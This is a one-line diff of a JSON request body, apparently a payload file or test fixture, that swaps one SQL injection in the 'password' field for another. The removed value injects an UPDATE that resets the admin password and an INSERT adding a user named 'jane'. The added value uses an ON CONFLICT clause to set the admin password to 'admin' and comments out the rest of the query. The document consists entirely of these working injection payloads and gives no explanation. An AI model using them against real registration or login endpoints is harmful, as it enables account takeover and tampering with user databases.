@@ -1,1 +1,1 @@
-{"username":"bob","password":"asdfasdf');UPDATE users SET password = 'admin' WHERE username = 'admin';INSERT INTO users (username, password) VALUES ('jane', 'asdfasdf"}
+{"username":"admin","password":"admin') ON CONFLICT(username) DO UPDATE SET password='admin'; --"}
